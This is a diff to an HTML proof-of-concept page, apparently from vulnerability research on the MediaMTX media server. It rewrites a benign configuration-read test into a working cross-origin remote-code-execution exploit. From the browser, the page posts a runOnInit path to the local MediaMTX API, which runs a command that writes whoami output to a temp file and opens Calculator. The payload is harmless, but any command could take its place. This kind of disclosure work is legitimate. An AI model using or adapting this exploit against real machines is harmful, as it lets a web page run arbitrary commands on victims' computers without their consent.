@@ -3,33 +3,47 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>MediaMTX Loopback CORS/LNA Test</title>
+  <title>MediaMTX CORS/LNA bounded runOnInit proof</title>
   <style>
     body { font-family: system-ui, sans-serif; max-width: 900px; margin: 40px auto; padding: 0 16px; }
-    input { width: 100%; box-sizing: border-box; padding: 8px; }
-    button { margin: 8px 8px 8px 0; padding: 8px 12px; }
+    input { width: 100%; box-sizing: border-box; padding: 8px; margin: 6px 0 12px; }
+    button { margin: 6px 8px 6px 0; padding: 8px 12px; }
     pre { white-space: pre-wrap; background: #f4f4f4; padding: 12px; border-radius: 6px; }
+    code { word-break: break-all; }
   </style>
 </head>
 <body>
-  <h1>MediaMTX Loopback CORS/LNA Test</h1>
-  <p>This page performs only bounded runtime configuration reads and a temporary logLevel change, then restores the original value.</p>
+  <h1>MediaMTX CORS/LNA bounded runOnInit proof</h1>
+  <p>
+    Disposable local lab only. This test adds one temporary runtime path whose
+    <code>runOnInit</code> writes a marker/identity file into <code>%TEMP%</code>
+    and opens Calculator. It does not modify mediamtx.yml.
+  </p>
 
   <label>
     API base
     <input id="base" value="http://localhost:19997/v3">
   </label>
 
-  <div>
-    <button id="read">Read config</button>
-    <button id="run">Run bounded mutation test</button>
-  </div>
+  <p><strong>Command:</strong></p>
+  <pre id="cmd"></pre>
+
+  <button id="run">1. Add temporary path and execute</button>
+  <button id="cleanup">2. Delete temporary path</button>
 
   <pre id="out"></pre>
 
 <script>
 const out = document.getElementById("out");
 const baseInput = document.getElementById("base");
+const command =
+  'cmd /c "whoami > %TEMP%\\mediamtx-cors-rce-poc.txt & ' +
+  'echo MEDIAMTX_CORS_RCE_POC>>%TEMP%\\mediamtx-cors-rce-poc.txt & ' +
+  'start calc.exe & timeout /t 10 >nul"';
+
+document.getElementById("cmd").textContent = command;
+
+let pathName = null;
 
 function write(v) {
   out.textContent += (typeof v === "string" ? v : JSON.stringify(v, null, 2)) + "\n";
@@ -46,17 +60,14 @@ async function req(path, options = {}) {
   };
 
   write(`--> ${opts.method || "GET"} ${url}`);
+
   try {
     const r = await fetch(url, opts);
     const text = await r.text();
     let body = text;
     try { body = JSON.parse(text); } catch (_) {}
-    const result = {
-      ok: r.ok,
-      status: r.status,
-      allowOrigin: r.headers.get("access-control-allow-origin"),
-      body
-    };
+
+    const result = { ok: r.ok, status: r.status, body };
     write(result);
     return result;
   } catch (e) {
@@ -66,36 +77,6 @@ async function req(path, options = {}) {
   }
 }
 
-async function getGlobal() {
-  const r = await req("/config/global/get");
-  if (!r.ok) throw new Error(`GET failed: HTTP ${r.status}`);
-  return r.body;
-}
-
-async function patchLogLevel(level) {
-  const r = await req("/config/global/patch", {
-    method: "PATCH",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ logLevel: level }),
-  });
-  if (!r.ok) throw new Error(`PATCH failed: HTTP ${r.status}`);
-  return r;
-}
-
-document.getElementById("read").onclick = async () => {
-  out.textContent = "";
-  write({
-    pageOrigin: location.origin,
-    isSecureContext: window.isSecureContext,
-    userAgent: navigator.userAgent,
-  });
-  try {
-    await getGlobal();
-  } catch (e) {
-    write(`RESULT: blocked/failed: ${e.message}`);
-  }
-};
-
 document.getElementById("run").onclick = async () => {
   out.textContent = "";
   write({
@@ -104,41 +85,48 @@ document.getElementById("run").onclick = async () => {
     userAgent: navigator.userAgent,
   });
 
-  let original;
+  pathName = "cors-rce-poc-" + Date.now();
+
+  const body = {
+    runOnInit: command,
+    runOnInitRestart: false
+  };
+
   try {
-    const before = await getGlobal();
-    original = before.logLevel;
-    const temporary = original === "debug" ? "info" : "debug";
+    const r = await req("/config/paths/add/" + encodeURIComponent(pathName), {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(body),
+    });
 
-    write(`Original logLevel: ${original}`);
-    write(`Temporary logLevel: ${temporary}`);
-
-    await patchLogLevel(temporary);
-    const after = await getGlobal();
-
-    if (after.logLevel !== temporary) {
-      throw new Error(`readback mismatch: expected ${temporary}, got ${after.logLevel}`);
+    if (!r.ok) {
+      throw new Error(`path add failed: HTTP ${r.status}`);
     }
 
-    await patchLogLevel(original);
-    const restored = await getGlobal();
-
-    if (restored.logLevel !== original) {
-      throw new Error(`restore mismatch: expected ${original}, got ${restored.logLevel}`);
-    }
-
-    write("RESULT: SUCCESS — cross-origin credential-free read/PATCH/readback/restore completed.");
+    write(`PATH: ${pathName}`);
+    write("EXPECTED FILE: %TEMP%\\mediamtx-cors-rce-poc.txt");
+    write("EXPECTED VISIBLE EFFECT: Calculator opens.");
+    write("Check the MediaMTX console for a runOnInit command-start message.");
   } catch (e) {
-    write(`RESULT: blocked/failed: ${e.message}`);
+    write(`RESULT: failed: ${e.message}`);
+  }
+};
 
-    if (original !== undefined) {
-      try {
-        await patchLogLevel(original);
-        write("Cleanup: original logLevel restoration attempted successfully.");
-      } catch (restoreErr) {
-        write(`Cleanup warning: restore failed: ${restoreErr.message}`);
-      }
-    }
+document.getElementById("cleanup").onclick = async () => {
+  if (!pathName) {
+    write("No path created in this page session.");
+    return;
+  }
+
+  try {
+    const r = await req("/config/paths/delete/" + encodeURIComponent(pathName), {
+      method: "DELETE",
+    });
+    if (!r.ok) throw new Error(`path delete failed: HTTP ${r.status}`);
+    write(`Deleted runtime path: ${pathName}`);
+    pathName = null;
+  } catch (e) {
+    write(`Cleanup failed: ${e.message}`);
   }
 };
 </script>
